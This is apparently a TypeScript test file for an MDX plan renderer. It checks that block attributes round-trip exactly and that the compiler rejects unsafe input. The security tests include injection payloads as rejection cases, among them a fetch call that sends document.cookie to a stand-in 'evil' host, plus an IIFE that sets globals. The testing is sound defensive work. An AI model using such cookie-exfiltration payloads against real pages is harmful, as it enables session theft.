import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vite-plus/test";

import { compilePlanMdx } from "./MdxPlanRenderer";
import { PLAN_BLOCK_COMPONENTS, PLAN_BLOCKS, parsePlanBlock, serializePlanBlock } from "./registry";

/**
 * Verifies the MDX-plan vertical: (1) the byte-stable attr round-trip that is the
 * wire contract for authored plans, and (2) the 3-layer security model. This is
 * the high-risk surface (a wrong round-trip silently corrupts authored plans), so
 * it earns a test per AGENTS.md.
 */

const entryFor = (tag: string) => PLAN_BLOCKS.find((entry) => entry.tag === tag)!;
const codeEntry = entryFor("Code");
const dataModelEntry = entryFor("DataModel");
const roundTrip = (tag: string, data: unknown) =>
  parsePlanBlock(entryFor(tag), serializePlanBlock(entryFor(tag), data));

describe("mdx-plan block round-trip", () => {
  it("round-trips a Code block (multiline string attr)", () => {
    const data = {
      code: "export const x = 1\nconst y = 2\n",
      language: "ts",
      filename: "src/x.ts",
      maxLines: 12,
    };
    expect(parsePlanBlock(codeEntry, serializePlanBlock(codeEntry, data))).toEqual(data);
  });

  it("round-trips a DataModel block (JSON array props, diff fields inline)", () => {
    const data = {
      entities: [
        {
          id: "user",
          name: "User",
          fields: [
            { name: "id", type: "uuid", pk: true },
            { name: "org_id", type: "uuid", fk: "Org.id" },
          ],
        },
        { id: "org", name: "Org", change: "added" as const, fields: [{ name: "id", pk: true }] },
      ],
      relations: [{ from: "org", to: "user", kind: "1-n" as const, label: "members" }],
    };
    expect(parsePlanBlock(dataModelEntry, serializePlanBlock(dataModelEntry, data))).toEqual(data);
  });

  it("round-trips an Endpoint block (JSON array props; description is prose children, not an attr)", () => {
    const data = {
      method: "POST" as const,
      path: "/api/auth/token",
      summary: "Mint a token",
      params: [{ name: "userId", in: "body" as const, type: "string", required: true }],
      responses: [{ status: "201", description: "Created" }],
    };
    // description is serialized as prose children (dropped by the self-closing
    // serializer), so the attr round-trip covers everything else.
    expect(roundTrip("Endpoint", data)).toEqual({ ...data, method: "POST" });
  });

  it("round-trips a FileTree block", () => {
    const data = {
      title: "Changes",
      entries: [
        { path: "src/a.ts", change: "added" as const, note: "new" },
        { path: "src/b.ts", change: "modified" as const, snippet: "const x = 1\n", language: "ts" },
      ],
    };
    expect(roundTrip("FileTree", data)).toEqual(data);
  });

  it("round-trips an AnnotatedCode block (multiline code + line annotations)", () => {
    const data = {
      filename: "src/token.ts",
      language: "ts",
      code: "function mint() {\n  return sign(payload)\n}\n",
      annotations: [
        { lines: "2", label: "sign", note: "uses the KMS handle" },
        { lines: "1-3", note: "whole body" },
      ],
    };
    expect(roundTrip("AnnotatedCode", data)).toEqual(data);
  });

  it("round-trips a Diagram block (graph wrapped in a `data` attr)", () => {
    const data = {
      caption: "Flow",
      nodes: [
        { id: "a", label: "A", x: 10, y: 20 },
        { id: "b", label: "B", detail: "detail", x: 80, y: 20 },
      ],
      edges: [{ from: "a", to: "b", label: "go" }],
    };
    expect(roundTrip("Diagram", data)).toEqual(data);
  });

  it("round-trips a QuestionForm block", () => {
    const data = {
      questions: [
        {
          id: "ttl",
          title: "Default TTL?",
          mode: "single" as const,
          options: [
            { id: "s", label: "1h", recommended: true },
            { id: "l", label: "30d", detail: "larger blast radius" },
          ],
        },
        { id: "free", title: "Anything else?", mode: "freeform" as const },
      ],
    };
    expect(roundTrip("QuestionForm", data)).toEqual(data);
  });

  it("round-trips a Checklist block", () => {
    const data = {
      items: [
        { id: "a", label: "Ship the renderer", checked: true },
        { id: "b", label: "Wire annotations", note: "across all blocks" },
      ],
    };
    expect(roundTrip("Checklist", data)).toEqual(data);
  });

  it("round-trips a Table block (columns + string rows)", () => {
    const data = {
      columns: ["Block", "Risk"],
      rows: [
        ["Diff", "self-contained LCS"],
        ["Mermaid", "lazy dep"],
      ],
      density: "compact" as const,
    };
    expect(roundTrip("Table", data)).toEqual(data);
  });

  it("round-trips a VisualQuestions block (same shape as QuestionForm)", () => {
    const data = {
      questions: [
        {
          id: "tier",
          title: "Which fidelity?",
          mode: "single" as const,
          options: [{ id: "w", label: "Wireframe", recommended: true }],
        },
      ],
    };
    expect(roundTrip("VisualQuestions", data)).toEqual(data);
  });

  it("round-trips a Diff block (multiline before/after + line annotations)", () => {
    const data = {
      filename: "src/add.ts",
      language: "ts",
      mode: "split" as const,
      before: "export function add(a, b) {\n  return a\n}\n",
      after: "export function add(a: number, b: number) {\n  return a + b\n}\n",
      annotations: [{ side: "after" as const, lines: "2", label: "fix", note: "actually sum" }],
    };
    expect(roundTrip("Diff", data)).toEqual(data);
  });

  it("round-trips an OpenApi block (spec kept as a verbatim string)", () => {
    const data = {
      title: "Tokens",
      spec: '{\n  "openapi": "3.0.0",\n  "info": { "title": "T", "version": "1" },\n  "paths": {}\n}',
    };
    expect(roundTrip("OpenApi", data)).toEqual(data);
  });

  it("round-trips a Mermaid block (multiline source attr)", () => {
    const data = {
      source: "flowchart TD\n  A[Start] --> B{Decision}\n  B --> C[Done]\n",
      caption: "Flow",
    };
    expect(roundTrip("Mermaid", data)).toEqual(data);
  });

  it("round-trips a Callout block (tone attr; body is prose children)", () => {
    const data = { tone: "risk" as const, body: "Untrusted HTML is a second trust boundary." };
    // body is serialized as prose children (dropped by the self-closing
    // serializer), so the attr round-trip covers `tone`; body decodes to "".
    expect(roundTrip("Callout", data)).toEqual({ tone: "risk", body: "" });
  });

  it("round-trips a Json block (json kept as a verbatim string)", () => {
    const data = {
      title: "Payload",
      json: '{\n  "sub": "user_01",\n  "roles": ["member"]\n}',
      collapsedDepth: 2,
    };
    expect(roundTrip("Json", data)).toEqual(data);
  });
});

const GOOD = [
  "# Plan",
  "",
  "Some **bold** prose.",
  "",
  '<DataModel entities={[{ "id": "user", "name": "User", "fields": [{ "name": "id", "pk": true }] }]} />',
  "",
  '<Code language="ts" code={"export const mintToken = 1"} />',
  "",
].join("\n");

describe("mdx-plan security model", () => {
  it("renders good MDX with custom blocks + GFM through the registry", async () => {
    const Content = await compilePlanMdx(GOOD);
    const html = renderToStaticMarkup(
      createElement(Content, { components: PLAN_BLOCK_COMPONENTS }),
    );
    expect(html).toContain("<strong>bold</strong>");
    expect(html).toContain("User");
    expect(html).toContain('data-plan-block-type="data-model"');
    expect(html).toContain("mintToken"); // code body (SSR fallback <pre>)
  });

  it("renders the Phase 4 document blocks through the registry", async () => {
    const source = [
      '<Callout tone={"risk"}>\n\nUntrusted HTML is a second trust boundary.\n\n</Callout>',
      "",
      '<Checklist items={[{ "id": "a", "label": "Ship it", "checked": true }]} />',
      "",
      '<Table columns={["A", "B"]} rows={[["1", "2"]]} />',
      "",
      '<Diff filename="x.ts" before={"const a = 1\\n"} after={"const a = 2\\n"} />',
      "",
      '<VisualQuestions questions={[{ "id": "q", "title": "Which?", "mode": "single" }]} />',
      "",
      '<OpenApi spec={"{\\"openapi\\":\\"3.0.0\\",\\"info\\":{\\"title\\":\\"T\\",\\"version\\":\\"1\\"},\\"paths\\":{}}"} />',
    ].join("\n");
    const Content = await compilePlanMdx(source);
    const html = renderToStaticMarkup(
      createElement(Content, { components: PLAN_BLOCK_COMPONENTS }),
    );
    expect(html).toContain('data-plan-block-type="callout"');
    expect(html).toContain('data-plan-block-type="checklist"');
    expect(html).toContain('data-plan-block-type="table"');
    expect(html).toContain('data-plan-block-type="diff"');
    expect(html).toContain('data-plan-block-type="visual-questions"');
    expect(html).toContain('data-plan-block-type="openapi-spec"');
  });

  it("rejects imports/exports at compile", async () => {
    await expect(compilePlanMdx('import fs from "node:fs"\n\n# hi')).rejects.toThrow();
  });

  it("rejects raw {expression} bodies at compile", async () => {
    await expect(compilePlanMdx("# hi\n\nvalue: {globalThis.location}")).rejects.toThrow();
  });

  // B1 regression: attribute-value expressions compile to executable JS and are
  // NOT reached by the body-node walk. Each of these must be rejected at compile,
  // or a `.mdx` opened in the preview panel runs arbitrary browser JS.
  it.each([
    ["sequence expression", '<Code language="ts" code={((globalThis.__pwned = true), "x")} />'],
    [
      "IIFE",
      '<Code language="ts" code={(function(){ globalThis.__pwned2 = true; return "y" })()} />',
    ],
    ["fetch call", "<Code language=\"ts\" code={fetch('https://evil/' + document.cookie)} />"],
    ["member access", '<Code language="ts" code={window.location.href} />'],
    ["arrow function", '<Code language="ts" code={(() => globalThis.x)()} />'],
  ])("rejects non-literal attribute expression: %s", async (_label, source) => {
    await expect(compilePlanMdx(source)).rejects.toThrow();
  });

  it("still compiles legitimate JSON-literal attribute expressions on real blocks", async () => {
    const source = [
      '<DataModel entities={[{ "id": "user", "name": "User", "fields": [{ "name": "id", "pk": true }] }]} />',
      "",
      '<Diagram data={{ "nodes": [{ "id": "a", "label": "A" }], "edges": [] }} />',
      "",
      '<Code language="ts" code={"export const x = 1"} maxLines={12} />',
      "",
      "<QuestionForm questions={[]} />",
    ].join("\n");
    const Content = await compilePlanMdx(source);
    const html = renderToStaticMarkup(
      createElement(Content, { components: PLAN_BLOCK_COMPONENTS }),
    );
    expect(html).toContain('data-plan-block-type="data-model"');
    expect(html).toContain('data-plan-block-type="diagram"');
    expect(html).toContain("export const x = 1");
  });

  it("rejects unknown components (not in the closed registry)", async () => {
    const Content = await compilePlanMdx("<Malicious onClick={1} />");
    expect(() =>
      renderToStaticMarkup(createElement(Content, { components: PLAN_BLOCK_COMPONENTS })),
    ).toThrow();
  });

  // S1 regression: an un-id'd block must NOT emit `data-plan-block-id=""` — the
  // empty attr defeats the `assignBlockIds` fallback and collides every un-id'd
  // block onto the first `[data-plan-block-id=""]` match.
  it("omits data-plan-block-id when the author gives no id", async () => {
    const source = [
      '<Code language="ts" code={"const a = 1"} />',
      "",
      '<Code language="ts" code={"const b = 2"} />',
    ].join("\n");
    const Content = await compilePlanMdx(source);
    const html = renderToStaticMarkup(
      createElement(Content, { components: PLAN_BLOCK_COMPONENTS }),
    );
    expect(html).not.toContain('data-plan-block-id=""');
  });
});
